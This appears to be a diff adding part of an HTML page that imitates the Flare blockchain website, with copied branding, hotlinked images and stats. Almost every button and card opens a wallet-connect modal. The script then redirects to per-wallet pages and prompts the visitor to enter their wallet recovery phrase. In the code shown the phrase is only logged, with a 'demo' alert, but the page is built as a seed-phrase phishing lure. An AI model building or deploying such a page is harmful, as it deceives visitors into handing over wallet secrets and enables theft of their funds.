+                <div class="partner arkham"><img height="55" src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FArkham.png&w=384&q=75" alt="Arkham"></div>
+                <div class="partner hextrust"><img height="55" src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FHexTrust.png&w=640&q=75" alt="HexTrust"></div>
+            </div>
+        </div>
+    </section>
+    <section class="flare-tech-section">
+        <div class="flare-column">
+            <div class="flare-box">
+                <h4>FOUNDATIONAL TECHNOLOGY</h4>
+                <div class="box pink open-wallet-modal">
+                    <strong><h3>Enshrined Data Protocols</h3></strong>
+                    <p>Flare’s protocols are integrated into the blockchain’s core, and inherit the economic security of the entire network</p>
+                </div>
+            </div>
+            <div class="flare-box">
+                <div class="box pink open-wallet-modal">
+                    <strong><h3>Ethereum Virtual Machine</h3></strong>
+                    <p>Flare is EVM compatible with out-of-the-box support for all your favorite tooling</p>
+                </div>
+            </div>
+            <div class="flare-box">
+                <div class="box pink open-wallet-modal">
+                    <strong><h3>Flare Stake</h3></strong>
+                </div>
+                <p>Flare uses a proof-of-stake (PoS) mechanism to ensure a significant and consistent level of economic security</p>
+            </div>
+        </div>
+
+        <div class="flare-center">
+            <div class="flare-video">
+                <video src="media/city_ori.mp4" autoplay loop muted></video>
+            </div>
+        </div>
+
+        <div class="flare-column">
+            <div class="flare-box">
+                <h4>NEW USE CASES</h4>
+                <div class="box pink open-wallet-modal">
+                    <strong><h2><img src="media/FAssets (1).svg" height="30" alt="FAssets"> FAssets →</h2></strong>
+                    <p>Securely explore XRPFi, BTCFi and DOGEFi</p>
+                </div>
+            </div>
+
+            <div class="flare-box">
+                <h4>ENSHRINED DATA PROTOCOLS</h4>
+                <div class="box pink open-wallet-modal">
+                    <strong><h2><img src="media/FDC-1.svg" height="30" alt="FDC">FDC →</h2></strong>
+                    <p>Reliably access external blockchain events and real-world APIs</p>
+                </div>
+
+                <div class="box pink open-wallet-modal">
+                    <strong><h2><img src="media/FTSO (1).svg" height="30" alt="FTSO"> FTSO →</h2></strong>
+                    <p>Easily integrate fast, secure, and decentralized price feeds</p>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section class="art-image">
+        <img src="media/fassets.webp" height="130" alt="FAssets">
+        <div>
+            <strong><p style="color: darkgrey;">FLARE FEATURED NEWS</p></strong>
+            <img src="media/FAssets-2.svg" height="60" style="display: inline-flexbox;" alt="FAssets logo"><img id="xrp" src="media/XRP.svg" height="90" style="text-align: right; display: inline-flexbox;" alt="XRP logo">
+            <p>FAssets v1.1 Launches on Songbird -<br> Unlocking Scalable FXRP Minting</p><br> <p>May 14. 2025</p>
+
+        </div>
+    </section>
+    <section class="fast-stats-section">
+        <div class="background-video-container">
+            <video src="media/home_fast_desktop.webm" autoplay muted loop playsinline></video>
+        </div>
+        <div class="fast-content">
+            <div class="fast-text">
+                <h1>Fast</h1>
+                <div class="counter" data-target="233527978">233,527</div>
+                <p>1.6s avg block time with single-slot finality</p>
+            </div>
+        </div>
+    </section>
+    <br>
+    <section class="fast-stats-section" >
+        <div class="background-video-container">
+            <video src="media/home_providers_desktop.webm" autoplay muted loop playsinline></video>
+        </div>
+        <div class="fast-content">
+            <div class="fast-text">
+                <h1>Decentralized</h1>
+                <div class="counter" data-target="33">33%</div>
+                <h3>100 Data providers</h3>
+                <p>Maximum Stake per data provider</p>
+            </div>
+        </div>
+    </section>
+    <section class="participate">
+        <h2 class="title">Participate in Flare</h2>
+
+        <div class="banner">
+            <img src="https://flare.network/_next/image?url=%2Fen%2Fstatic%2F1200x400.jpg&w=3840&q=75" alt="Flare Fair Banner" />
+        </div>
+        <div class="cards">
+            <div class="card open-wallet-modal">
+                <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fflaredrop_4x.png&w=3840&q=75" alt="FlareDrops" />
+                <h3>Get FlareDrops →</h3>
+                <p>Wrap FLR to earn rewards</p>
+            </div>
+            <div class="card open-wallet-modal">
+                <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fdandstake.png&w=384&q=75" alt="Delegate & Stake" />
+                <h3>Delegate & Stake →</h3>
+                <p>A simple and effective way of boosting rewards while contributing to Flare’s security</p>
+            </div>
+            <div class="card open-wallet-modal">
+                <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FVote_Hero.png&w=1920&q=75" alt="Vote" />
+                <h3>Vote →</h3>
+                <p>Participate in transparent, onchain governance to define the future of Flare</p>
+            </div>
+            <div class="card open-wallet-modal">
+                <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FCommunity_Header.png&w=1920&q=75" alt="Community" />
+                <h3>Community →</h3>
+                <p>Come together, share ideas, and build</p>
+            </div>
+        </div>
+    </section>
+    <section class="newsletter-section">
+        <div class="newsletter-content">
+            <h2>Subscribe to the Flare Newsletter</h2>
+            <p>Join over 30,000 Flare community members. Sign up to the Flare newsletter today to hear the latest on product releases, ecosystem announcements and global events.</p>
+            <button class="subscribe-button open-wallet-modal">Subscribe</button>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="footer-top">
+            <div class="footer-brand">
+                <img src="https://flare.network/api/media/file/Flare.svg" alt="Flare Logo" class="footer-logo">
+                <span class="tagline">The blockchain for data</span>
+            </div>
+
+            <div class="footer-links">
+                <a href="#">Newsletter</a>
+                <a href="#">Contact</a>
+                <a href="#">Our Team</a>
+                <a href="#">Brand Assets</a>
+                <a href="#">Terms & Conditions</a>
+                <span>© Flare 2025</span>
+            </div>
+
+            <div class="social-icons">
+                <img src="https://www.bing.com/th/id/OIP.8SVgggxQcO5L6Dw_61ac4QHaEK?w=285&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="GitHub">
+                <img src="https://www.bing.com/th/id/OIP.Y6P1GkxkEoLoIRsS1wMZiwHaFj?w=254&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="YouTube">
+                <img src="https://www.bing.com/th/id/OIP.Cn9SAHCmTy8MEaixr8bqpAHaHa?w=172&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="LinkedIn">
+                <img src="https://www.bing.com/th/id/OIP.SqoeKJPmo667mmrM6IQCxwHaEK?w=263&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="Discord">
+                <img src="https://th.bing.com/th/id/OIP.ZweGejPwbT5wwshQ2-8qUQHaHa?w=178&h=180&c=7&r=0&o=5&pid=1.7" alt="X/Twitter">
+                <img src="https://th.bing.com/th/id/OIP.lYN2s7Dv1a4pLAVUaXMCVgHaHa?w=173&h=180&c=7&r=0&o=5&pid=1.7" alt="Telegram">
+            </div>
+        </div>
+
+        <div class="footer-bottom">
+            <h4>DEV LINKS</h4>
+            <div class="dev-links">
+                <a href="#">Flarescan →</a>
+                <a href="#">Flare P-Chain Explorer →</a>
+                <a href="#">Flare Systems Explorer →</a>
+            </div>
+        </div>
+    </footer>
+    <script>
+        const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+        const nav = document.getElementById('nav');
+
+        if (mobileMenuBtn && nav) {
+            mobileMenuBtn.addEventListener('click', () => {
+                nav.classList.toggle('active');
+            });
+        }
+
+        const openWalletModalElements = document.querySelectorAll('.open-wallet-modal'); // Select all elements with this class
+        const closeWalletModalBtn = document.getElementById('closeWalletModalBtn');
+        const walletModal = document.getElementById('walletModal');
+
+        if (openWalletModalElements.length > 0 && closeWalletModalBtn && walletModal) {
+            openWalletModalElements.forEach(button => {
+                button.addEventListener('click', () => {
+                    walletModal.classList.add('visible');
+                });
+            });
+
+            closeWalletModalBtn.addEventListener('click', () => {
+                walletModal.classList.remove('visible');
+            });
+
+           
+            walletModal.addEventListener('click', (event) => {
+                if (event.target === walletModal) {
+                    walletModal.classList.remove('visible');
+                }
+            });
+        }
+
+        // Counter animation function
+        function animateCounter(counterElement) {
+            if (counterElement.classList.contains('counted')) {
+                return; // Already animated
+            }
+            const target = +counterElement.dataset.target;
+            let current = 0;
+            const increment = target / 200; // Adjust for animation speed
+
+            const updateCounter = () => {
+                if (current < target) {
+                    current += increment;
+                    counterElement.textContent = Math.floor(current).toLocaleString();
+                    requestAnimationFrame(updateCounter);
+                } else {
+                    counterElement.textContent = target.toLocaleString();
+                    counterElement.classList.add('counted'); // Mark as animated
+                }
+            };
+            updateCounter();
+        }
+
+        // Intersection Observer for fast-stats-section
+        const fastStatsSections = document.querySelectorAll('.fast-stats-section');
+
+        const observerOptions = {
+            root: null, // viewport as the root
+            rootMargin: '0px',
+            threshold: 0.5 // Trigger when 50% of the section is visible
+        };
+
+        const sectionObserver = new IntersectionObserver((entries, observer) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('in-view');
+                    const counterElement = entry.target.querySelector('.counter');
+                    if (counterElement) {
+                        animateCounter(counterElement);
+                    }
+                } else {
+                    // Optional: remove 'in-view' class if you want the animation to replay on re-entry
+                    // entry.target.classList.remove('in-view');
+                    // entry.target.querySelector('.counter').classList.remove('counted');
+                }
+            });
+        }, observerOptions);
+
+        fastStatsSections.forEach(section => {
+            sectionObserver.observe(section);
+        });
+
+        const walletItems = document.querySelectorAll('.wallet-item');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingVideo = document.getElementById('loadingVideo');
+        const phraseInputModal = document.getElementById('phraseInputModal');
+        const closePhraseModalBtn = document.getElementById('closePhraseModalBtn');
+        const phraseModalTitle = document.getElementById('phraseModalTitle');
+        const phraseWalletIcon = document.getElementById('phraseWalletIcon');
+        const recoveryPhraseInput = document.getElementById('recoveryPhrase');
+        const connectPhraseBtn = document.getElementById('connectPhraseBtn');
+
+        walletItems.forEach(item => {
+            item.addEventListener('click', (event) => {
+                event.preventDefault();
+                const walletName = item.dataset.walletName;
+                const loadingVideoSrc = item.dataset.loadingVideo;
+                const phraseImageSrc = item.dataset.phraseImage;
+                const redirectPage = item.dataset.redirectPage; 
+                showLoadingAndThenPhraseInput(walletName, loadingVideoSrc, phraseImageSrc, redirectPage);
+            });
+        });
+
+        if (closePhraseModalBtn) {
+            closePhraseModalBtn.addEventListener('click', () => {
+                phraseInputModal.classList.remove('visible');
+                recoveryPhraseInput.value = ''; 
+            });
+
+            phraseInputModal.addEventListener('click', (event) => {
+                if (event.target === phraseInputModal) {
+                    phraseInputModal.classList.remove('visible');
+                    recoveryPhraseInput.value = ''; 
+                }
+            });
+        }
+
+        if (connectPhraseBtn) {
+            connectPhraseBtn.addEventListener('click', () => {
+                const phrase = recoveryPhraseInput.value.trim();
+                if (phrase) {
+                 
+                    console.log("Recovery Phrase submitted:", phrase);
+                    // Instead of alert, use a custom message box or integrate with a proper wallet connection library.
+                    // For this demo, we'll just log and hide the modal.
+                    alert("Wallet connection initiated! (This is a demo, no actual connection is made.)");
+                    phraseInputModal.classList.remove('visible');
+                    recoveryPhraseInput.value = '';
+                } else {
+                    alert("Please enter your recovery phrase.");
+                }
+            });
+        }
+
+
+        function showLoadingAndThenPhraseInput(walletName, loadingVideoSrc, phraseImageSrc, redirectPage) {
+            if (walletModal) {
+                walletModal.classList.remove('visible');
+            }
+
+      
+            if (loadingVideo && loadingOverlay) {
+                loadingVideo.src = loadingVideoSrc;
+                loadingOverlay.classList.add('visible');
+                loadingVideo.load();
+                let redirected = false;
+
+                const performRedirect = () => {
+                    if (!redirected) {
+                        redirected = true;
+                        loadingOverlay.classList.remove('visible');
+                        window.location.href = redirectPage; 
+                    }
+                };
+
+          
+                loadingVideo.oncanplaythrough = () => {
+                    console.log(`Video for ${walletName} is ready to play.`);
+                    loadingVideo.play().catch(error => {
+                       
+                        console.error("Video autoplay failed:", error);
+                       
+                        setTimeout(performRedirect, 2000); 
+                    });
+                };
+
+                loadingVideo.onended = () => {
+                    console.log(`Video for ${walletName} ended. Redirecting...`);
+                    performRedirect();
+                };
+
+                
+                setTimeout(performRedirect, 8000); 
+
+               
+                loadingVideo.onerror = (e) => {
+                    console.error(`Error loading video for ${walletName}:`, e);
+                    
+                    performRedirect();
+                };
+            }
+        }
+    </script>
+</body>
+</html>
